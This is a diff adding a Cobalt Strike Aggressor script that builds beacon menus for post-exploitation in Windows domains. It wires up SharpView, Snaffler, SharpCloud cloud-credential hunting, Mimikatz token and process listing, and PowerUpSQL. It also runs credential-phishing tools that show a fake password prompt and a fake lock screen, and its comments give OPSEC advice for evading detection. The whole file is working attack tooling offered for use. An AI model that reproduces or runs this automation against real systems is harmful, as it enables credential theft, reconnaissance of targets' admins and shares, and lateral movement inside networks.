@@ -1,0 +1,1051 @@
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		  Menus 		############################
+
+#################################################
+
+#   Local Admin Access
+
+#################################################
+menu "Local Admin Access" {
+
+item "Find Admin Access - Sneaky  - T1033"{
+	local('$bid');
+		foreach $bid ($1){
+			sneakyadmin($bid);
+		}
+	}
+			
+item "Find Admin Access - Loud  - T1033"{
+	local('$bid');
+		foreach $bid ($1){
+			loudadmin($bid);
+		}
+	}
+			
+		item "Find Admin and Share Access - Sneaky  - T1033"{
+			local('$bid');
+				foreach $bid ($1){
+					sneakyshare($bid);
+				}
+			}
+			
+		item "Find Admin and Share Access - Sneaky-ISH  - T1033"{
+			local('$bid');
+				foreach $bid ($1){
+					sneakish($bid);
+				}
+			}
+			
+		item "Find Admin and Share Access - LOUD  - T1033"{
+			local('$bid');
+				foreach $bid ($1){
+					loudshare($bid);
+				}
+			}
+			
+		item "Find Admin - Sniper Mode  - T1033"{
+			local('$bid');
+				foreach $bid ($1){
+					snipeaccess($bid);
+				}
+			}
+
+}
+#################################################
+
+#   Domain Enumeration
+
+#################################################
+menu "Domain Enumeration"
+{
+#Domain Name
+item "List Domain"{
+	local('$bid');
+		foreach $bid ($1){
+			getnetdomain($bid);
+			}
+		}
+
+#Get Domain Security Identifier (SID)
+item "List Domain SID"{
+	local('$bid');
+		foreach $bid ($1){
+			getdomainsid($bid);
+			}
+		}
+
+
+#Get Domain Security Identifier (SID)
+item "List Domain SID (Specify Domain)"{
+	local('$bid');
+		foreach $bid ($1){
+			getdomainsidspec($bid);
+			}
+		}
+}
+#################################################
+
+#   Domain User Enumeration
+
+#################################################
+menu "Domain User Enumeration"
+{
+#List Admins in Domain
+					
+	item "List Admins in Domain  - T1087"{
+		local('$bid');
+			foreach $bid ($1){
+				getnetuseradmin($bid);
+			}
+		}
+menu "Find User Location"
+{
+
+#Find User Location By Machine Name
+					
+item "Find User Location By Machine Name  - T1033"{
+	local('$bid');
+		foreach $bid ($1){
+			finduserlocationmachine($bid);
+		}
+	}
+
+#Find User Location by Username
+item "Find User Location by Username  - T1033"{
+	local('$bid');
+		foreach $bid ($1){
+			finduserlocationuser($bid);
+		}
+	}
+
+#Find User Location by Machine and Username
+#item "Find User Location by Machine and Username  - T1033"{
+#	local('$bid');
+#		foreach $bid ($1){
+#			getnetuseradmin($bid);
+#		}
+#	}
+
+}
+}
+#################################################
+
+#   Domain Computer Object Enumeration
+
+#################################################
+menu "Domain Computer Object Enumeration"
+{
+	
+#List computers in Domain
+					
+		item "List Computers  - T1018"{
+			local('$bid');
+				foreach $bid ($1){
+					getdomaincomputer($bid);
+				}
+			}
+		
+#List computers in Domain by specifying Domain
+					
+		item "List Computers In Specified Domain  - T1018"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetcomputerdom($bid);
+				}
+			}
+
+#List computers in Domain by specifying Operating System
+					
+		item "List Computers with Specific Operating System  - T1018"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetcomputeros($bid);
+				}
+			}			
+}
+#################################################
+
+#   Domain Group Enumeration
+
+#################################################
+menu "Domain Group Enumeration"
+{
+########List Groups in Domain##################
+		item "List Groups in Domain"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetgroup($bid);
+				}
+			}
+		
+		item "Enterprise Admin"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetgroupenterpriseadmin($bid);
+				}
+			}
+			
+		item "Domain Admin"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetgroupdomainadmin($bid);
+				}
+			}
+			
+		item "Schema Admin"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetgroupschemaadmin($bid);
+				}
+			}
+		
+		item "Account Operator"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetgroupaccountoperator($bid);
+				}
+			}
+					
+			
+		item "Administrator"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetgroupadministrator($bid);
+				}
+			}
+}
+	
+
+#################################################
+
+#   Domain/Forest Enumeration
+
+#################################################
+menu "Domain/Forest Enumeration"
+{
+
+#Get Net Forest
+		item "List Domains of Forest  - T1"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetforest($bid);
+					}
+				}
+				
+#Get Net Forest Domain
+		item "Enumerate All Domains for The Current Forest  - T1482"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetforestdomain($bid);
+					}
+				}		
+				
+#Get Net Domain Trust
+		item "Enumerate Domain Trust relationships  - T1482"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetdomaintrust($bid);
+					}
+				}				
+				
+#Get Net Forest Trust
+		item "Enumerate Forest Trusts Of Current Domain  - T1482"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetforesttrust($bid);
+					}
+				}
+}
+
+#################################################
+
+#   ACL Checks
+
+#################################################
+
+menu "ACL Checks"
+{
+
+#Get ACLs associated with a specified object
+		item "ACLs associated with User Object"{
+			local('$bid');
+				foreach $bid ($1){
+					getobjacl($bid);
+					}
+				}
+}
+#################################################
+
+#   File and Share Enumeration
+
+#################################################
+menu "File And Share Enumeration"
+{
+
+#################################################
+#   Snaffler - SubMenu
+#################################################
+menu "Snaffler"{
+
+
+########################
+#Find All Shares
+########################
+item "Display All Available Shares (Noisy) - T1135"{
+    local('$bid');
+        foreach $bid ($1){
+            findallshares($bid);
+      }
+   }
+
+########################
+#Find Shares - Specify Domain
+########################
+item "Display All Available Shares Based On Domain - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomainshares($bid);
+      }
+   }
+########################
+#Find Shares - Specify DC
+########################
+item "Display All Available Shares Based On DC - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomaincontrollershares($bid);
+      }
+   }
+########################
+#Find Shares - Specify DC & Domain
+########################
+item "Display All Available Shares Based On DC And Domain - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomaincontrolleranddomainshares($bid);
+      }
+   }
+########################
+#Find Shares - User Enumeration All
+########################
+item "Display All Available User Shares (Noisy) - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finduserallshares($bid);
+      }
+   }
+########################
+#Find Shares - User Enumeration & Specify Domain
+########################
+item "Display All Available User Shares Based On Domain - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finduserdomainshares($bid);
+      }
+   }
+########################
+#Find Shares - User Enumeration Specify Domain Controller
+########################
+item "Display All User Available Shares Based On Domain Controller - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomaincontrollershares($bid);
+      }
+   }
+########################
+#Find Shares - User Enumeration Specify Domain Controller & Domain
+########################
+item "Display All Available Shares Based On Domain Controller & Domain - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finduserdomaincontrolleranddomainshares($bid);
+      }
+   }
+} #End Snaffler Menu
+
+
+
+#Find Cloud Credential Files
+item "Find Cloud Creds"{
+	local('$bid');
+		foreach $bid ($1){
+			cloudcreds($bid);
+			}
+		}
+
+#Find Domain Share
+item "Find Domain Shares  - T1135"{
+	local('$bid');
+		foreach $bid ($1){
+			finddomainshare($bid);
+		}
+	}
+				
+#Find Interesting Domain Shares 
+item "Find Interesting Domain Shares  - T1135"{
+	local('$bid');
+		foreach $bid ($1){
+			findinterestingdomainsharefile($bid);
+		}
+	}
+
+#Find File Servers 
+item "Find File Servers  - T1083"{
+	local('$bid');
+		foreach $bid ($1){
+			getnetfileserver($bid);
+		}
+	}
+}
+
+
+#################################################
+
+#   Mimikatz: Token Enumeration
+
+#################################################
+menu "Mimikatz: Token Enumeration"
+{
+#List All Tokens
+
+item "List Tokens"{
+	local('$bid');
+		foreach $bid ($1){
+			tokenlist($bid);
+		}
+	}
+			
+#List Admin Tokens
+item "List Admin Tokens"{
+	local('$bid');
+		foreach $bid ($1){
+			listadmintokens($bid);
+		}			
+	}
+
+
+#List Domain Admin Tokens
+item "List Domain Admin Tokens"{
+	local('$bid');
+		foreach $bid ($1){
+			listdatokens($bid);
+		}
+	}
+
+#List Enterprise Admin Tokens
+
+item "List Enterprise Admin Tokens"{
+	local('$bid');
+		foreach $bid ($1){
+			listeatokens($bid);
+		}
+	}
+}
+#################################################
+
+#   Phishing Users
+
+#################################################
+menu "Phishing Users"
+{
+#Run CredPhisher
+					
+		item "Prompt for Username and Password  - T1141"{
+			local('$bid');
+				foreach $bid ($1){
+					credphisher($bid);
+				}
+			}
+		
+			
+#Run Lock Screen Phishing Exploit
+					
+		item "Show Lockscreen to Phish Password  - T1141"{
+			local('$bid');
+				foreach $bid ($1){
+					lockscreen($bid);
+				}
+			}
+		
+}
+
+#################################################
+
+#   EDR Query
+
+#################################################
+
+
+#################################################
+
+#   Process Listing
+
+#################################################
+menu "Process Listing"
+{
+item "Mimikatz List Processes  - T1057"{
+	local ('$bid');
+		foreach $bid ($1){
+			mimilistprocesses($bid);
+		}
+	}
+
+item "Get Processes (WMI)  - T1057"{
+	local ('$bid');
+		foreach $bid ($1){
+			getwmiprocesses($bid);
+		}
+	}
+	
+item "Get Remote Processes (WMI)  - T1057"{
+	local ('$bid');
+		foreach $bid ($1){
+			getremotewmiprocesses($bid);
+		}
+	}	
+}
+
+#################################################
+##
+##   Service Enumeration Menu
+##
+#################################################
+
+menu "Service Enumeration"{
+
+# Enumerate Services
+item "Service Enumeration - Current Computer - T1046"{
+
+    local('$bid');
+        foreach $bid ($1){
+            serviceenumerationlocalhost($bid);
+      }
+   }
+
+
+# Enumerate Remote Services
+item "Service Enumeration - Remote Computer - T1046"{
+
+    local('$bid');
+        foreach $bid ($1){
+            getremoteservices($bid);
+      }
+   }
+
+} #End Menu Popup
+
+
+
+#################################################
+
+#   SQL Database
+
+#################################################
+menu "SQL Database"{
+
+#PowerUpSQL
+menu "PowerUpSQL"
+{
+#List Cached Credentials
+item "Initialize PowerUpSQL (DO THIS FIRST)"{
+		local('$bid');
+				foreach $bid ($1){
+					psqlinit($bid);
+				}
+			}
+			
+#Discover Local SQL Server Instances
+item "Discover Local SQL Server Instances"{
+		local('$bid');
+				foreach $bid ($1){
+					psqldiscloc($bid);
+				}
+			}
+
+#PowerUpSQL Discover Domain SQL Servers
+item "Discover Domain SQL Server Instances"{
+		local('$bid');
+				foreach $bid ($1){
+					psqldiscdom($bid);
+				}
+			}
+
+#PowerUpSQL Discover Domain SQL Servers Information	
+item "Discover Domain SQL Server Information"{
+		local('$bid');
+				foreach $bid ($1){
+					psqldiscdominfo($bid);
+				}
+			}
+
+#PowerUpSQL Discover Domain SQL Servers - Check Availability
+item "Discover Domain SQL Server Availability"{
+		local('$bid');
+				foreach $bid ($1){
+					psqldiscdomcheck($bid);
+				}
+			}
+
+#PowerUpSQL Find Links To Remote Servers			
+item "Find Links To Remote Servers"{
+		local('$bid');
+				foreach $bid ($1){
+					psqlfindrem($bid);
+				}
+			}
+
+#PowerUpSQL Enumerate Database Links		
+item "Enumerate Database Links"{
+		local('$bid');
+				foreach $bid ($1){
+					psqlfindrem($bid);
+				}
+			}
+}
+
+#DAFT
+menu "DAFT"
+{
+
+
+}
+}
+
+
+
+
+
+
+
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		 Functions 		############################
+
+#################################################
+
+#   Local Admin Access
+
+#################################################
+sub sneakyadmin{
+bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -Delay 20");
+}
+sub loudadmin{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-LocalAdminAccess");
+}
+sub sneakyshare{
+bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -CheckShareAccess -Delay 20");
+}
+sub sneakish{
+bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -CheckShareAccess -Delay 7");
+}
+sub loudshare{
+bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -CheckShareAccess");
+}
+sub sharpup{
+bexecute_assembly($1, script_resource('../exe/SharpUp.exe'));
+}
+sub sweetpotato{
+bexecute_assembly($1, script_resource('exe/SweetPotato.exe'));
+}
+sub snipeaccess{
+prompt_text("Computer Name - FQDN)", "", lambda({
+bexecute_assembly($bids, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -CheckShareAccess -ComputerName $1");
+}, $bids => $1));
+}			
+
+#################################################
+
+#   Domain Enumeration
+
+#################################################
+
+#SharpView Get NetDomain
+sub getnetdomain{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetDomain");
+}
+
+# SharpView get current domain's SID
+sub getdomainsid{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainSID");
+}
+
+# SharpView get specified domain's SID
+sub getdomainsidspec{
+prompt_text("Please Specify Domain", "", lambda({
+bexecute_assembly($bids, script_resource('../exe/SharpView.exe'), "Get-DomainSID -Domain $1");
+}, $bids => $1));
+}
+#################################################
+
+#   Domain User Enumeration
+
+#################################################
+
+# SharpView List Admin Users
+sub getnetuseradmin{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetUser -AdminCount");
+}
+
+# SharpView Find User Locations By Machine Name
+sub finduserlocationmachine{
+prompt_text("Machine Name - (FQDN)", "", lambda({
+bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Find-DomainUserLocation -ComputerName $1");
+}, $bids => $1));
+}
+
+# SharpView Find User Locations by Username
+sub finduserlocationuser{
+prompt_text("Enter Username", "", lambda({
+bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Find-DomainUserLocation -UserIdentity $1 -CheckAccess");
+}, $bids => $1));
+}
+
+#################################################
+
+#   Domain Computer Object Enumeration
+
+#################################################
+
+# SharpView Get Domain Computers
+sub getdomaincomputer{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainComputer");
+}
+
+# Sharpview Get Net Computer by Domain
+sub getnetcomputerdom{
+prompt_text("Specifiy a Domain (FQDN)", "", lambda({
+bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-NetComputer -Domain $1");
+}, $bids => $1));
+}
+
+# Sharpview Get Net Computer by OS
+sub getnetcomputeros{
+prompt_text("Specifiy an Operating System", "", lambda({
+bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-NetComputer -OperatingSystem $1");
+}, $bids => $1));
+}
+#################################################
+
+#   Domain Group Enumeration
+
+#################################################			
+
+#SharpView list Groups
+sub getnetgroup{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup');
+}
+
+# SharpView list Enterprise Admins
+sub getnetgroupenterpriseadmin{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Enterprise Admins" -Recursive');
+}
+
+# SharpView list Domain Admins
+sub getnetgroupdomainadmin{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Domain Admins" -Recursive');
+}
+
+# SharpView list Schema Admins
+sub getnetgroupschemaadmin{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Schema Admins" -Recursive');
+}
+
+# SharpView list account operators
+sub getnetgroupaccountoperator{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Account Operators" -Recursive');
+}
+
+# SharpView list Administrators group
+sub getnetgroupadministrator{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Administrators" -Recursive');
+}			
+			
+#################################################
+
+#   Domain/Forest Enumeration
+
+#################################################
+
+# SharpView Get-NetForest
+sub getnetforest{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetForest");
+}
+
+# SharpView Get-NetForestTrust
+sub getnetforesttrust{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetForestTrust");
+}
+
+# SharpView Get-NetDomainTrust
+sub getnetdomaintrust{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetDomainTrust");
+}
+
+# SharpView Get-NetForestDomain
+sub getnetforestdomain{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetForestDomain");
+}
+
+#################################################
+
+#   ACL Checks
+
+#################################################
+
+# SharpView Get ACL Object
+sub getobjacl{
+prompt_text("Sam Account Name", "", lambda({
+bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-ObjectAcl -SamAccountName $1 -ResolveGUIDs");
+}, $bids => $1));
+}
+
+#################################################
+
+#   File/Share Enumeration
+
+#################################################
+
+
+#################################################
+#   Snaffler
+#################################################
+sub findallshares{
+bexecute_assembly($1, script_resource("/exe/Snaffler.exe"), "-s -j 75 -v data");
+}
+
+sub finddomainshares{
+prompt_text("Insert Domain Name", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -d $1 -v data");
+}, $bids => $1));
+}
+
+sub finddomaincontrollershares{
+prompt_text("Insert DomainController", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -c $1 -v data");
+}, $bids => $1));
+}
+
+sub finddomaincontrolleranddomainshares{
+    $bid = $1;
+    $dialog = dialog("Show Domain and DC Shares", %(dom => "", dc => "", execmethod => "Execute-Assembly"), lambda({
+       $cmdargs = "";
+		$cmdargs = "-d $3['dom'] -c $3['dc']";
+        if ($3["execmethod"] eq "Execute-Assembly"){         
+            bexecute_assembly($bid, script_resource('/exe/Snaffler.exe'), '-s -i -j 75 '.$cmdargs.''" -v data");
+        }
+    }));
+    dialog_description($dialog, "Show Domain and DC Shares");
+    drow_text($dialog, "dom",  "Please Enter Domain");
+    drow_text($dialog, "dc",  "Please Enter DC FQDN");
+    dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
+#prompt_text("Insert Domain Name", "", lambda({
+#bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -d $1 -v data");
+#}, $bids => $1));
+#}
+
+sub finduserallshares{
+bexecute_assembly($1, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -v data");
+}
+
+sub finduserdomainshares{
+prompt_text("Insert Domain Name", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -d $1 -v data");
+}, $bids => $1));
+}
+
+sub finduserdomaincontrollershares{
+prompt_text("Insert DomanController", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -c $1 -v data");
+}, $bids => $1));
+}
+
+#sub finddomaincontrolleranddomainshares{
+#prompt_text("Insert Domain Name", "", lambda({
+#bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -d $1 -v data");
+#}, $bids => $1));
+#}
+
+##Share Only Enum
+#"Snaffler.exe -s -j 75 -v data" - Will be at top of menu, this will show all the things and will be noisy
+#Snaffler.exe -s -j 75 -d "$DOMAIN" -v data Will be second item menu, will need to pop up and have user enter domain name
+#Snaffler.exe -s -j 75 -c "$DOMAINCONTROLLER" -v data Specify which domain controller (OPSEC) - try not to hit Azure or ATP DC's - PDC is preferred
+#Snaffler.exe -s -j 75 -c "$DOMAINCONTROLLER" -d "$DOMAIN" -v data Specify which domain controller (OPSEC) and Domain - try not to hit Azure or ATP DC's - PDC is preferred
+##User Enum
+#Snaffler.exe -s -u -j 75-v data" - Will be at top of menu, this will show all the things and will be noisy (Added user switch)
+#Snaffler.exe -s -u -j 75 -d "$DOMAIN" -v data Will be second item menu, will need to pop up and have user enter domain name (Added user switch)
+#Snaffler.exe -s -u -j 75 -c "$DOMAINCONTROLLER" -v data Specify which domain controller (OPSEC) - try not to hit Azure or ATP DC's - PDC is preferred (Added user switch)
+#Snaffler.exe -s -u -j 75 -c "$DOMAINCONTROLLER" -d "$DOMAIN" -v data Specify which domain controller (OPSEC) and Domain - try not to hit Azure or ATP DC's - PDC is preferred (Added user switch)
+
+
+
+# Cloud Creds
+sub cloudcreds{
+bexecute_assembly($1, script_resource('/exe/SharpCloud.exe'), "all");
+}
+
+# SharpView Find Domain Share
+sub finddomainshare{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-DomainShare");
+}
+
+# Cloud Creds
+sub cloudcreds{
+bexecute_assembly($1, script_resource('/exe/SharpCloud.exe'), "all");
+}
+
+# SharpView Find Interesting Domain Shares
+sub findinterestingdomainsharefile{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-InterestingDomainShareFile");
+}
+
+# SharpView Find File Servers
+sub getnetfileserver{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetFileServer");
+}
+
+#################################################
+
+#   Mimikatz: Token Enumeration
+
+#################################################
+# Mimikatz List Tokens
+sub tokenlist{
+bmimikatz($1, "token::list");
+}
+
+# Mimikatz List Admin Tokens
+sub listadmintokens{
+bmimikatz($1, "token::list /admin");
+}
+
+#Mimikatz List Domain Admin Tokens
+sub listdatokens{
+bmimikatz($1, "token::list /domainadmin");
+}
+
+#Mimikatz List Enterprise Admin Tokens
+sub listeatokens{
+bmimikatz($1, "token::list /enterpriseadmin");
+}
+
+#################################################
+
+#   Phishing Users
+
+#################################################
+
+# Phish Users with small pop up box
+sub credphisher{
+bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), 'Please_Enter_Your_Password');
+}
+
+# Phish Users with fake lockscreen
+sub lockscreen{
+bexecute_assembly($1, script_resource('/exe/WindowsFormsApp9.exe'));
+}
+
+#################################################
+
+#   EDR Query
+
+#################################################
+
+
+#################################################
+
+#   Process Listing
+
+#################################################
+#Mimikatz List Process
+sub mimilistprocesses{
+bmimikatz($1, "process::list");
+}
+
+# SharpView Get-WMIProcesses
+sub getwmiprocesses{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-WMIProcess");
+}
+
+# SharpView Get-WMIProcesses Remote
+sub getremotewmiprocesses{
+prompt_text("Remote Machine - (FQDN)", "", lambda({
+bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-WMIProcess -ComputerName $1");
+}, $bids => $1));
+}
+
+#################################################
+##
+##   Service Enumeration Functions
+##
+#################################################
+
+sub serviceenumerationlocalhost{
+bexecute_assembly($1, script_resource('/exe/AtYourService.exe'));
+}
+
+# View Remote Services
+sub getremoteservices{
+prompt_text("Remote Machine - (FQDN)", "", lambda({
+bexecute_assembly($bids, script_resource('/exe/AtYourService.exe'), "$1");
+}, $bids => $1));
+}
+
+
+
+#################################################
+
+#   PowerUpSQL
+
+#################################################
+#PowerUpSQL Initialize			
+sub psqlinit{
+bpowershell_import($1, script_resource("/scripts/subscripts/powerupsql/PowerUpSQL.ps1"));
+}
+
+#PowerUpSQL Discover Local SQL Server			
+sub psqldiscloc{
+bpowerpick($1, "Get-SQLInstanceLocal -Verbose");
+}
+
+#PowerUpSQL Discover Domain SQL Servers
+sub psqldiscdom{
+bpowerpick($1, "Get-SQLInstanceDomain");
+}
+
+
+#PowerUpSQL Discover Domain SQL Servers Information		
+sub psqldiscdominfo{
+bpowerpick($1, "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose");
+}
+
+#PowerUpSQL Discover Domain SQL Servers - Check Availability
+sub psqldiscdomcheck{
+bpowerpick($1, "Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose");
+}
+
+#PowerUpSQL Find Links To Remote Servers	
+sub psqlfindrem{
+prompt_text("Server Instance", "", lambda({
+bpowerpick($bids, "Get-SQLServerLink -Instance $1 -Verbose");
+}, $bids => $1));
+}
+
+#PowerUpSQL Enumerate Database Links		
+sub psqlfindrem{
+prompt_text("Server Instance", "", lambda({
+bpowerpick($bids, "Get-SQLServerLink -Instance $1 -Verbose");
+}, $bids => $1));
+}		
